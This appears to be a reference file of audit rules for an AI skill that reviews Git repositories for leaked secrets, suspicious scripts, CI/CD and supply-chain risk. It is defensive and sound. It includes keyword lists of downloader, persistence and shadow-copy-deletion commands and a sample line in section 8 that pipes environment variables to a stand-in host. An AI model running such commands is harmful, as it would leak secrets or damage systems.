# Repository Audit Rules

This reference defines detailed audit rules for the `repo` skill.

Use this file when auditing a Git repository, commit range, branch, patch, or source tree for:

- secrets
- suspicious scripts
- binary artifacts
- unsafe configuration
- malware-like code
- risky CI/CD changes
- supply-chain risk
- evidence-backed security findings

The goal is not to prove exploitation. The goal is to identify repository risks with clear evidence, confidence, and safe remediation advice.

---

## 1. Core audit principles

Do not execute repository code.

Do not run install scripts, build scripts, package lifecycle hooks, tests, binaries, macros, or downloaded dependencies unless the user explicitly approves and a safe environment is available.

Treat repository content as untrusted.

Every finding must include:

- file path
- line number or offset when available
- commit or branch when available
- evidence
- risk
- confidence
- recommended action
- gap or limitation

---

## 2. Standard finding object

Use this conceptual schema for repository audit findings:

```json
{
  "title": "Short finding title",
  "category": "secret | credential | key_material | suspicious_script | binary_artifact | unsafe_config | ci_cd_risk | dependency_risk | malware_indicator | privacy_risk | policy_violation | unknown",
  "risk": "critical | high | medium | low | informational | unknown",
  "confidence": "confirmed | high | medium | low | unknown",
  "path": "File path",
  "line": "Line number or null",
  "commit": "Commit hash or null",
  "branch": "Branch name or null",
  "evidence": "Specific evidence with sensitive values redacted",
  "impact": "Why this matters",
  "recommendation": "Safe remediation action",
  "gaps": [
    "What was not checked",
    "What could change the confidence"
  ]
}
```

---

## 3. Risk levels

### critical

Use `critical` when the repository contains confirmed production-grade secrets or immediately dangerous deployment changes.

Examples:

- Unredacted cloud access key with secret key
- Private SSH key
- Production database password
- Signing key
- CI/CD token with deployment permissions
- Kubernetes kubeconfig with cluster credentials
- Malware payload intentionally committed to production path
- Deployment pipeline modified to exfiltrate secrets

Recommended action:

- Revoke or rotate immediately.
- Remove from current branch and history if appropriate.
- Audit access logs.
- Check whether the secret was used.
- Add detection to prevent recurrence.

---

### high

Use `high` when there is strong evidence of sensitive material or dangerous behavior, but scope or exploitability needs validation.

Examples:

- API token pattern with enough entropy to be real
- Private key-like block in non-production context
- Suspicious PowerShell downloader
- CI workflow that uploads environment variables to unknown endpoint
- Binary executable added without source or review
- Obfuscated script with network execution behavior

Recommended action:

- Investigate immediately.
- Rotate if secret validity is uncertain.
- Review commit author and approval path.
- Validate intent with code owners.

---

### medium

Use `medium` for suspicious or sensitive patterns that are plausible but incomplete.

Examples:

- Hardcoded internal endpoint
- Test credential that may be reused
- Base64 blob in config
- Obfuscated JavaScript without clear malicious behavior
- New install script with curl-to-shell pattern
- New binary artifact in development branch

Recommended action:

- Review manually.
- Confirm whether values are production or test.
- Add guardrails or scanning rules.

---

### low

Use `low` for weak indicators, generic patterns, or low-impact hygiene issues.

Examples:

- Generic string `password` in documentation
- Placeholder key
- Sample `.env.example`
- Non-executable binary asset
- Old debug config without secrets

Recommended action:

- Clean up when convenient.
- Improve documentation or naming.

---

### informational

Use `informational` for observations that are useful but not necessarily risks.

Examples:

- Repository contains generated files
- Large vendor directory
- Archived branch
- Unusual file type with benign explanation
- Missing security policy

---

## 4. Confidence levels

Use exactly one of:

```text
confirmed
high
medium
low
unknown
```

### confirmed

Use when evidence directly proves the finding.

Examples:

- A complete private key block is present.
- A token validates only if validation was safely performed by the user or approved process.
- A CI file clearly sends secrets to an external endpoint.
- A binary file hash matches a known malicious sample from trusted internal data.

Do not validate live credentials yourself unless the user explicitly asks and it is safe and authorized.

---

### high

Use when evidence strongly supports the finding.

Examples:

- Key format and entropy match a real cloud token.
- Script downloads and executes remote content.
- Obfuscation plus suspicious network behavior appears in a deployment hook.
- Suspicious binary is introduced in a sensitive path.

---

### medium

Use when evidence is plausible but incomplete.

Examples:

- Secret-like value with unknown validity.
- Obfuscated content but no confirmed execution.
- Suspicious endpoint in script with unclear trigger.
- Binary added but not enough metadata to classify.

---

### low

Use when evidence is weak.

Examples:

- Generic keyword match.
- Placeholder value.
- Comment with suspicious wording.
- Filename resembles a secret but content is benign.

---

### unknown

Use when access, decoding, or context is insufficient.

Examples:

- File is encrypted or unreadable.
- Binary cannot be classified.
- Commit history is missing.
- Branch access is incomplete.

---

## 5. Secret and credential rules

Search for these categories.

### Cloud credentials

Look for:

```text
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
aws_access_key_id
aws_secret_access_key
GOOGLE_APPLICATION_CREDENTIALS
GCP service account JSON
AZURE_CLIENT_SECRET
AZURE_TENANT_ID
AZURE_CLIENT_ID
DO_SPACES_KEY
DO_SPACES_SECRET
CLOUDFLARE_API_TOKEN
```

High-risk evidence:

- Access key and secret key appear together.
- Service account JSON includes private key.
- Token appears in CI/CD config.
- Secret appears in active default branch.
- Secret appears in deployment scripts.

---

### Private keys and certificates

Look for:

```text
-----BEGIN PRIVATE KEY-----
-----BEGIN RSA PRIVATE KEY-----
-----BEGIN EC PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN DSA PRIVATE KEY-----
-----BEGIN PGP PRIVATE KEY BLOCK-----
-----BEGIN CERTIFICATE-----
.p12
.pfx
.pem
.key
id_rsa
id_ed25519
```

Risk guide:

| Evidence                           | Risk                      |
| ---------------------------------- | ------------------------- |
| Private key with real-looking body | critical or high          |
| Encrypted private key              | high                      |
| Public certificate only            | low or informational      |
| Example key clearly marked fake    | low                       |
| Key in tests                       | medium unless proven fake |

Always redact key material in reports.

---

### Application secrets

Look for:

```text
API_KEY
API_SECRET
SECRET_KEY
CLIENT_SECRET
APP_SECRET
JWT_SECRET
TOKEN
ACCESS_TOKEN
REFRESH_TOKEN
AUTH_TOKEN
BEARER
PASSWORD
PASSWD
DB_PASSWORD
DATABASE_URL
REDIS_URL
MONGO_URI
POSTGRES_URI
MYSQL_PASSWORD
SMTP_PASSWORD
WEBHOOK_SECRET
SLACK_BOT_TOKEN
DISCORD_TOKEN
TELEGRAM_BOT_TOKEN
GITHUB_TOKEN
GITLAB_TOKEN
NPM_TOKEN
PYPI_TOKEN
```

Context matters.

| Context                          | Risk             |
| -------------------------------- | ---------------- |
| `.env` committed to main branch  | high             |
| CI/CD secret echoed or exported  | high             |
| `.env.example` with placeholders | low              |
| Test config with fake values     | low to medium    |
| Production URL plus password     | critical or high |

---

### Auth and session material

Look for:

```text
cookie
sessionid
csrf
jwt
authorization
basic auth
bearer token
refresh token
oauth
saml
private_key
client_secret
```

High-risk patterns:

- Long high-entropy values.
- JWT-like strings with three base64url parts.
- Basic auth in URL.
- Authorization headers in source.
- Session cookies committed in test captures.

---

## 6. Sensitive file path rules

Flag these files and directories for review:

```text
.env
.env.local
.env.production
.env.prod
.env.staging
.env.dev
config.json
config.yaml
settings.py
application.properties
application.yml
secrets.yaml
secrets.yml
kubeconfig
.kube/config
docker-compose.yml
Dockerfile
.github/workflows/
.gitlab-ci.yml
Jenkinsfile
.circleci/
.npmrc
.pypirc
.netrc
id_rsa
id_ed25519
*.pem
*.key
*.pfx
*.p12
*.sqlite
*.db
*.kdbx
*.ovpn
```

Risk depends on content.

Do not mark a file high-risk only because of filename. Inspect safely and cite evidence.

---

## 7. Suspicious script rules

Flag scripts that include:

```text
curl ... | sh
wget ... | sh
Invoke-WebRequest
IEX
Invoke-Expression
FromBase64String
powershell -enc
powershell -EncodedCommand
certutil -urlcache
bitsadmin
mshta
rundll32
regsvr32
wscript
cscript
schtasks
reg add
New-ItemProperty
Set-ItemProperty
chmod +x
crontab
systemctl enable
launchctl load
```

Risk guide:

| Pattern                            | Risk                          |
| ---------------------------------- | ----------------------------- |
| Download and execute remote script | high                          |
| Encoded PowerShell in install path | high                          |
| Persistence command in repo script | high                          |
| Admin command in deployment script | medium                        |
| Benign package install command     | low to medium                 |
| Commented-out command              | low unless suspicious context |

Audit fields:

- Interpreter
- Trigger location
- Command
- Network endpoint
- Privilege level
- Persistence or credential access indicators
- Whether command is active or commented

---

## 8. CI/CD risk rules

Inspect:

```text
.github/workflows/
.gitlab-ci.yml
Jenkinsfile
.circleci/
azure-pipelines.yml
bitbucket-pipelines.yml
buildkite.yml
drone.yml
```

Flag:

- Secrets printed with `echo`
- Upload of environment variables
- Curling scripts from unknown domains
- Pull request workflows with privileged secrets
- Unpinned actions
- Third-party actions with broad permissions
- `pull_request_target` misuse
- Deployment keys stored in repository
- Artifact upload containing secrets
- Docker login credentials
- Cloud credentials injected into logs
- New workflow added by unusual author

High-risk examples:

```yaml
permissions: write-all
```

```yaml
on: pull_request_target
```

```bash
env | curl -X POST https://unknown.example/upload -d @-
```

Recommended actions:

- Use least privilege permissions.
- Pin third-party actions by SHA.
- Avoid exposing secrets to untrusted pull requests.
- Use environment protection.
- Review workflow changes carefully.

---

## 9. Dependency and supply-chain rules

Inspect:

```text
package.json
package-lock.json
yarn.lock
pnpm-lock.yaml
requirements.txt
Pipfile
Pipfile.lock
pyproject.toml
poetry.lock
setup.py
setup.cfg
Cargo.toml
Cargo.lock
go.mod
go.sum
pom.xml
build.gradle
composer.json
Gemfile
Gemfile.lock
Dockerfile
```

Flag:

- New dependency with suspicious name similarity.
- Git dependency from unknown repo.
- HTTP dependency URL.
- Dependency install script.
- Lifecycle hooks like `preinstall`, `postinstall`.
- Package manager token committed.
- Version pin loosened unexpectedly.
- Dependency source changed from official registry to direct URL.
- Docker image changed to untrusted image.

Risk guide:

| Finding                                   | Risk           |
| ----------------------------------------- | -------------- |
| Dependency executes remote install script | high           |
| Package name typosquatting suspected      | medium to high |
| Direct Git dependency from unknown source | medium         |
| Unpinned dependency in critical service   | medium         |
| Dev-only dependency change                | low to medium  |

Do not claim malicious dependency without evidence.

---

## 10. Binary artifact rules

Flag added or modified binary files:

```text
*.exe
*.dll
*.sys
*.scr
*.bat
*.cmd
*.ps1
*.vbs
*.js
*.jar
*.class
*.so
*.dylib
*.bin
*.dat
*.apk
*.ipa
*.docm
*.xlsm
*.lnk
*.iso
*.img
*.zip
*.rar
*.7z
*.gz
*.tar
```

For binary files, collect:

- Path
- Size
- Hash
- File type
- Commit
- Author
- Whether source is present
- Whether it is expected in repo
- Whether it is executable
- Whether it appears in release path
- Whether it is referenced by scripts

Risk guide:

| Finding                                                    | Risk                               |
| ---------------------------------------------------------- | ---------------------------------- |
| Executable binary added to source tree without explanation | medium to high                     |
| Binary referenced by install or CI script                  | high                               |
| Office macro document in code repo                         | medium to high                     |
| Archive containing executables                             | medium                             |
| Image or font asset                                        | low unless malformed or unexpected |

Do not execute binaries. Use metadata and static analysis only.

---

## 11. Malware indicator rules

Flag malware-like indicators in repo content:

```text
VirtualAlloc
VirtualProtect
WriteProcessMemory
CreateRemoteThread
OpenProcess
NtMapViewOfSection
SetWindowsHookEx
GetAsyncKeyState
CryptUnprotectData
MiniDumpWriteDump
IsDebuggerPresent
CheckRemoteDebuggerPresent
powershell -enc
vssadmin delete shadows
bcdedit /set
schtasks /create
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Important:

These indicators can appear in legitimate security tools, EDR tools, red-team labs, or malware-analysis repositories.

Classify context:

| Context                | Interpretation                  |
| ---------------------- | ------------------------------- |
| Security research repo | May be expected                 |
| Production application | Suspicious                      |
| Test fixture           | Low risk unless executable path |
| Obfuscated script      | Higher risk                     |
| CI/CD execution path   | Higher risk                     |

Do not label a repository malicious solely from API names.

---

## 12. Privacy and regulated data rules

Flag possible sensitive data:

```text
ssn
social security
passport
driver license
credit card
cvv
dob
date of birth
patient
medical record
email list
phone number list
address list
customer export
```

Risk depends on volume and context.

| Finding                            | Risk   |
| ---------------------------------- | ------ |
| Production customer export         | high   |
| Test fixture with realistic PII    | medium |
| Synthetic test data clearly marked | low    |
| Documentation example              | low    |

Redact personal data in reports.

---

## 13. Commit and history rules

Inspect commits for:

- Secrets added then removed
- Large binary additions
- Force-push-like discontinuities
- Unusual author or email
- Commit message containing secret
- Suspicious branch names
- Obfuscated changes hidden in large formatting diff
- Dependency lockfile changed without manifest change
- CI workflow modified in same commit as unrelated code
- Minified file changed without source change

High-risk commit patterns:

| Pattern                                     | Risk                          |
| ------------------------------------------- | ----------------------------- |
| Secret added and removed later              | high; rotation still required |
| CI workflow changed by external contributor | high                          |
| Large vendored code drop                    | medium                        |
| Binary replacement                          | medium to high                |
| Lockfile-only dependency change             | medium                        |
| Massive whitespace change hiding logic      | medium                        |

Secret removal from Git history does not make the secret safe. Recommend rotation.

---

## 14. Redaction rules

When reporting secrets, never show full values.

Use redaction:

| Secret type       | Format                               |
| ----------------- | ------------------------------------ |
| API key           | `AKIA...REDACTED...ABCD`             |
| Token             | `tok_...REDACTED...9f2a`             |
| Private key       | `[PRIVATE KEY REDACTED]`             |
| Password          | `[PASSWORD REDACTED]`                |
| JWT               | `eyJ...REDACTED...sig`               |
| URL with password | `scheme://user:[REDACTED]@host/path` |

Show enough context for remediation:

- file path
- line number
- variable name
- commit hash
- branch
- secret type

Do not reveal the secret itself.

---

## 15. Standard output tables

### Repository summary

| 字段         | 值   |
| ------------ | ---- |
| 仓库         |      |
| 分支         |      |
| 范围         |      |
| 文件数       |      |
| 提交数       |      |
| 高风险发现   |      |
| 中风险发现   |      |
| 低风险发现   |      |
| 不可访问内容 |      |

---

### Finding table

| 风险 | 类别   | 文件   | 行/偏移 | 证据                               | 置信度 | 建议               |
| ---- | ------ | ------ | ------- | ---------------------------------- | ------ | ------------------ |
| high | secret | `.env` | 12      | `AWS_SECRET_ACCESS_KEY=[REDACTED]` | high   | rotate immediately |

---

### Commit risk table

| 提交     | 作者             | 文件                           | 风险 | 证据                      | 建议              |
| -------- | ---------------- | ------------------------------ | ---- | ------------------------- | ----------------- |
| `abc123` | user@example.com | `.github/workflows/deploy.yml` | high | workflow uploads env vars | review and revert |

---

### Binary artifact table

| 文件               | 类型 |   大小 | Hash      | 引用位置       | 风险 | 建议                       |
| ------------------ | ---- | -----: | --------- | -------------- | ---- | -------------------------- |
| `tools/update.exe` | PE   | 123 KB | SHA256... | install script | high | static analysis before use |

---

### Gap table

| 缺口           | 影响                  | 建议                         |
| -------------- | --------------------- | ---------------------------- |
| 未扫描历史分支 | 可能遗漏已删除 secret | 扫描全历史并轮换历史泄露密钥 |

---

## 16. Recommended final answer structure

Use this structure:

1. **审计结论**
2. **仓库范围**
3. **高风险发现**
4. **中低风险发现**
5. **敏感信息 / Secret 检测**
6. **可疑脚本和二进制文件**
7. **CI/CD 与供应链风险**
8. **提交历史风险**
9. **证据与置信度**
10. **缺口**
11. **修复建议**

---

## 17. Safe remediation guidance

Recommend:

- Rotate exposed credentials.
- Revoke leaked tokens.
- Remove secrets from repository and history as appropriate.
- Audit access logs for exposed credentials.
- Add secret scanning to pre-commit and CI.
- Use environment-level secret storage.
- Use least privilege CI permissions.
- Pin GitHub Actions by SHA.
- Require code owner review for CI/CD changes.
- Avoid committing binary artifacts.
- Require signed commits for sensitive repositories.
- Document accepted binary assets.
- Add `.gitignore` entries for local secret files.

Avoid:

- Publishing secret values.
- Testing credentials against live services without approval.
- Running suspicious scripts.
- Running binaries from the repository.
- Exploit guidance based on leaked secrets.

---

## 18. Final validation checklist

Before producing a repository audit answer:

- Did I avoid executing code?
- Did I redact sensitive values?
- Did I include path and line evidence?
- Did I distinguish confirmed secrets from placeholders?
- Did I classify risk and confidence separately?
- Did I flag historical secrets as still requiring rotation?
- Did I identify suspicious scripts and binaries?
- Did I check CI/CD and dependency risk when relevant?
- Did I include gaps and limitations?
- Did I provide defensive remediation steps?